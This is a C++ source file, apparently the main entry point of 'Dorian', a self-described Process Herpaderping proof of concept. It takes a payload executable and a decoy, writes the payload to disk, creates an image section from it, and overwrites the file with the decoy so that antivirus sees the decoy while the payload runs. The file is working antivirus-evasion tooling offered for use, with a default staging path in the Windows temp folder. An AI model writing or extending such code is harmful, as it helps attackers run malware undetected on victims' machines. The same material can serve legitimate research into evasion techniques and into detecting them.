#include "Common.hpp"
#include "ErrorHandler.hpp"
#include "PayloadManager.hpp"
#include "FileManager.hpp"
#include "ProcessExecutor.hpp"
#include <iostream>
#include <string>

static void PrintUsage(const char *argv0)
{
    std::cerr << "Usage: " << argv0 << " <payload.exe> <decoy.exe> [host_path]" << std::endl;
    std::cerr << "  payload.exe   PE to execute." << std::endl;
    std::cerr << "  decoy.exe     PE written to disk after section creation (what AV sees)." << std::endl;
    std::cerr << "  host_path     Path where the file is staged (default: C:\\Windows\\Temp\\dorian.exe)" << std::endl;
}

int main(int argc, char *argv[])
{
    if (argc < 3)
    {
        PrintUsage(argv[0]);
        return 1;
    }

    std::string payloadPath = argv[1];
    std::string decoyPath   = argv[2];
    std::wstring hostPath   = (argc >= 4)
        ? std::wstring(argv[3], argv[3] + strlen(argv[3]))
        : L"C:\\Windows\\Temp\\dorian.exe";

    std::cout << "[*] Dorian — Process Herpaderping PoC" << std::endl;
    std::cout << "[*] Payload : " << payloadPath << std::endl;
    std::cout << "[*] Decoy   : " << decoyPath   << std::endl;

    if (!DynamicNT::Instance().Initialize())
    {
        std::cerr << "[-] Failed to resolve NTAPI functions." << std::endl;
        return 1;
    }
    std::cout << "[+] NTAPI functions resolved." << std::endl;

    std::vector<uint8_t> payload = PayloadManager::LoadPayload(payloadPath);
    if (payload.empty()) return 1;
    if (!PayloadManager::ValidatePE(payload)) return 1;

    std::vector<uint8_t> decoy = PayloadManager::LoadPayload(decoyPath);
    if (decoy.empty()) return 1;

    uint32_t entryPoint = PayloadManager::GetEntryPoint(payload);
    if (!entryPoint)
    {
        std::cerr << "[-] Could not determine entry point." << std::endl;
        return 1;
    }
    std::cout << "[+] Payload validated. Entry point RVA: 0x" << std::hex << entryPoint << std::dec << std::endl;

    // Write payload → create section → overwrite with decoy. Returns the section.
    HANDLE hSection = FileManager::WriteAndObscure(hostPath, payload, decoy);
    if (!hSection) return 1;

    bool success = ProcessExecutor::Run(hSection, entryPoint, hostPath);
    ErrorHandler::SafeCloseHandle(hSection);

    if (success)
        std::cout << "[+] Process Herpaderping successful. The portrait is clean." << std::endl;
    else
        std::cerr << "[-] Payload execution failed." << std::endl;

    std::cout << "[*] Press Enter to exit..." << std::endl;
    std::cin.get();

    return success ? 0 : 1;
}
